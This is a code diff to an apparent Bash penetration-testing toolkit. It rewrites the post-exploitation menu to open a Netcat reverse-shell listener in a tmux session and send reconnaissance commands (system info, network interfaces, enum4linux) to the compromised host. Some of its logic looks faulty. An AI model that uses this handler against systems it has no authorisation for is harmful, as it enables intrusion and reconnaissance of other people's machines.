@@ -1859,66 +1859,57 @@ osint_nuclei() {
     echo -e "${GREEN}[+] Nuclei scan completed. Results saved in $output_file${NC}"
 }
 
-listen_port=1234
 # Function to handle post-exploitation tasks
 post_exploitation() {
-    while true; do
-        option=$(whiptail --title "Post-Exploitation Menu" --menu "Choose an option" 15 60 4 \
-        "1" "Gather System Information" \
-        "2" "Network Interface Information" \
-        "3" "Back to Main Menu" 3>&1 1>&2 2>&3)
-
-        case $option in
-            1)
-                execute_command "uname -a && lsb_release -a"
-                ;;
-            2)
-                execute_command "ifconfig || ip a"
-                ;;
-            3)
-                break
-                ;;
-            *)
-                whiptail --msgbox "Invalid option. Please try again." 8 45
-                ;;
-        esac
-    done
-}
-
-# Function to execute command in the reverse shell
-execute_command() {
-    local cmd="$1"
-    echo -e "${BLUE}[+] Executing: $cmd${NC}"
-    x-terminal-emulator -e "echo '$cmd' | nc localhost $listen_port" &
-}
-
-# Function to start the reverse shell listener
-start_listener() {
+    echo -e "${BLUE}[+] Post-Exploitation Menu:${NC}"
     read -p "Enter the port to listen on: " listen_port
     echo -e "${BLUE}Setting up Netcat listener on port $listen_port...${NC}"
-    x-terminal-emulator -e "nc -lvnp $listen_port" &
+
+    # Create a new tmux session for the Netcat listener
+    tmux new-session -d -s nc_listener "nc -lvnp $listen_port"
+
+    echo -e "${GREEN}[+] Reverse shell obtained. Select a post-exploitation option:${NC}"
+    while true; do
+        echo -e "1) Gather System Information (2s)"
+        echo -e "2) Network Interface Information (2s)"
+        echo -e "3) Run enum4linux (5s)"
+        echo -e "4) Back to Main Menu"
+        read -p "Select an option: " post_option
+
+        case $post_option in
+            1) send_command_with_delay "uname -a && lsb_release -a" 2 ;;
+            2) send_command_with_delay "ifconfig || ip a" 2 ;;
+            3) send_command_with_delay "enum4linux -a" 5 ;;
+            4) break ;;
+            *) echo -e "${RED}Invalid option. Please try again.${NC}" ;;
+        esac
+
+        # Capture the output from the reverse shell
+        tmux capture-pane -t nc_listener -S -1000
+        tmux save-buffer -b nc_listener /tmp/tmux_buffer.txt
+        cat /tmp/tmux_buffer.txt
+        > /tmp/tmux_buffer.txt
+    done
+
+    # Kill the tmux session after post-exploitation tasks are done
+    tmux kill-session -t nc_listener
 }
 
-# Main menu function
-main_menu() {
-    while true; do
-        option=$(whiptail --title "Main Menu" --menu "Choose an option" 15 60 4 \
-        "1" "Post-Exploitation" \
-        "2" "Exit" 3>&1 1>&2 2>&3)
+# Function to send command to the reverse shell and wait
+send_command_with_delay() {
+    local cmd="$1"
+    local delay="$2"
 
-        case $option in
-            1)
-                start_listener
-                post_exploitation
-                ;;
-            2)
-                exit 0
-                ;;
-            *)
-                whiptail --msgbox "Invalid option. Please try again." 8 45
-                ;;
-        esac
+    tmux send-keys -t nc_listener "$cmd" C-m
+    echo -e "${YELLOW}[+] Waiting for $delay seconds...${NC}"
+
+    # Countdown timer
+    for ((i = delay; i > 0; i--)); do
+        echo -ne "$i\033[0K\r"
+        sleep 1
     done
+
+    echo -e "${GREEN}[+] Capturing output...${NC}"
 }
 
 check_install_dependencies() {
